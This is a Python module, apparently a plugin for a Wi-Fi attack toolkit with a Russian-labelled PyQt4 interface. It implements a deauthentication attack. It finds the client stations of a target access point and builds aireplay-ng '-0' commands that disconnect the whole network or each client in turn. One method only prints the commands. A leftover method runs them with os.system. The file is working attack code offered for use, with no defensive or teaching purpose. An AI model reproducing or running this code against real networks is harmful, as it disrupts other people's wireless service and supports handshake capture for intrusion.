#!/usr/bin/env python
# -*- coding: utf-8 -*-
#

##############################################################################
from PyQt4 import QtCore
_fromUtf8 = QtCore.QString.fromUtf8
import os
import attack
##############################################################################

class DeAuth(attack.Attack):

    def __init__(self,  interpreter):
        super(DeAuth, self).__init__(interpreter)
        self.aireplayPath = '/usr/local/sbin/aireplay-ng'
        self.defaultPacketsCount = 10
        self.logger = attack.logger

    def _getReplayArgs(self, packetsCount=None):
        if packetsCount is None:
            packetsCount = self.defaultPacketsCount

        opts = [
            self.aireplayPath,
            '-0',
            str(packetsCount),
            '--ignore-negative-one'
        ]
        return opts

    def do(self, **kw):
        self.logger.debug('Deauth attack begin')
        self.logger.debug('Attack: %s', str(kw))
        self.startDeauthAttack(**kw)
        self.logger.debug('Deauth attack end')

    def name(self):
        return _fromUtf8("Деавторизация клиентов сети")

    def key(self):
        return 'deauth'

    def startDeauthAttack(self, **kw):
        graph = kw['graph'].g
        ap = kw['ap']
        iface = kw['iface']

        ap_mac = ap['mac']
        essid = ap['essid']
        ifaceMon = iface.monitor()

        clients_mac = filter(
            lambda x: graph.node[x].get('nType') == 'STA',
            graph.neighbors(ap_mac)
        )

        if clients_mac:
            self._attack_with_clients(ap_mac, essid, ifaceMon, clients_mac)
        else:
            self._attack_without_clients(ap_mac, essid, ifaceMon)

    def _execute_attack(self, cmds):
        for cmd in cmds:
            #os.system(' '.join(cmd))
            print 'Execute: ', ' '.join(cmd)
            import time
            time.sleep(2)

    def _attack_without_clients(self, ap_mac, essid, iface):
        cmds = ['-a', ap_mac, essid, iface]
        self._execute_attack([self._getReplayArgs() + cmds])

    def _attack_with_clients(self, ap_mac, essid, iface, clients):
        cmds = []
        opts = self._getReplayArgs()
        for client in clients:
            cmds.append(opts + ['-c', client, '-a', ap_mac, essid, iface])
        self._execute_attack(cmds)

    def __startDeauthAttack(self, **kw):
        mac = kw['mac']
        iface = kw['ifaceMon']
        essid = kw.get('essid')
        clients = kw.get('clients')

        if essid is None:
            essid_s = ""
        else:
            essid_s = "-e %s" % essid

        if clients is None:
            cmds = [
                '/usr/local/sbin/aireplay-ng'
                ' -0 10 --ignore-negative-one -a %s %s %s' % (
                    mac,
                    essid_s,
                    iface
                )
            ]
        else:
            cmds = []
            for client in clients:
                cmds.append(
                    '/usr/local/sbin/aireplay-ng'
                    ' -0 10 --ignore-negative-one -c %s -a %s %s %s ' % (
                        client,
                        mac,
                        essid_s,
                        iface
                    )
                )

        for cmd in cmds:
            os.system(cmd)

Attack = DeAuth
